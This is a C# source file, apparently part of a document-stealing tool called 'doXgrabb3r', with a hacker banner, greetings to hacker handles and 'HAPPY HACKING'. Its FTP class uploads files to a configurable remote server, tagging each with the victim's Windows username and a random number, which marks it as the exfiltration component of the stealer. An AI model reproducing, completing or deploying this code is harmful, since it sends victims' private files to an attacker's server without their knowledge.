
using System;
using System.IO;
using System.Net;

/*

    .___    ____  ___                   ___.  ___.   ________        
  __| _/____\   \/  /  ________________ \_ |__\_ |__ \_____  \______ 
 / __ |/  _ \\     /  / ___\_  __ \__  \ | __ \| __ \  _(__  <_  __ \
/ /_/ (  <_> )     \ / /_/  >  | \// __ \| \_\ \ \_\ \/       \  | \/
\____ |\____/___/\  \\___  /|__|  (____  /___  /___  /______  /__|   
     \/           \_/_____/            \/    \/    \/       \/       

*/

//
// <author>
//     <value>Jahanzaib Khan Durrani</value>
// </author>
//
// <CyberName>
//     <value>MAGniFic0</value>
//     <value>...</value>
// </CyberName>
//
// <greetings>
//     <value>Mr. P.Teo</value>
//     <value>VirKid36</value>
//     <value>Mr. Exploit</value>
//     <value>X HaxOr</value>
//     <value>Mr. Anon</value>
//     <value>Code Breaker</value>
//     <value>5IL3NT H4CK3R</value>
//     <value>HaxOr Hees</value>
// </greetings>
//
// <fucksTo>
//     <value>Idea Stealer 1</value>
//     <value>Idea Stealer 2</value>
//     <value>Idea Stealer 3</value>
//     <desc>PM IF YOU WANT THE NAMES. Yes, Yes, You know them as 1337s ;)</desc>
// </fucksTo>
//
// For signing the assembly refer to :
// https://msdn.microsoft.com/en-us/library/6f05ezxy(v=vs.110).aspx 
//
/*           HAPPY HACKING :)            */


namespace doXgrabb3r {
 class FTP {
  private string ftpusername;
  private string ftppassword;
  private string ftpurl;
  private string usernamePC = "_";

  public FTP(string host, string user, string pass, int rand) {
   usernamePC = Environment.UserName + "_" + rand + "_";
   ftpurl = host;
   ftpusername = user;
   ftppassword = pass;
  }

  public string ftp_upload(string filePath) {
   string filename = Path.GetFileName(filePath);

   FtpWebRequest ftpClient = (FtpWebRequest) FtpWebRequest.Create(ftpurl + usernamePC + filename);
   ftpClient.Credentials = new NetworkCredential(ftpusername, ftppassword);
   ftpClient.Method = WebRequestMethods.Ftp.UploadFile;
   ftpClient.UseBinary = true;
   ftpClient.KeepAlive = true;
   FileInfo fi = new FileInfo(filePath);
   ftpClient.ContentLength = fi.Length;
   byte[] buffer = new byte[4097];
   int bytes = 0;
   int total_bytes = (int) fi.Length;
   FileStream fs = fi.OpenRead();
   Stream rs = ftpClient.GetRequestStream();
   while (total_bytes > 0) {
    bytes = fs.Read(buffer, 0, buffer.Length);
    rs.Write(buffer, 0, bytes);
    total_bytes = total_bytes - bytes;
   }
   //fs.Flush();
   fs.Close();
   rs.Close();
   FtpWebResponse uploadResponse = (FtpWebResponse) ftpClient.GetResponse();
   string value = uploadResponse.StatusDescription;
   uploadResponse.Close();

   return value;
  }



 }
}
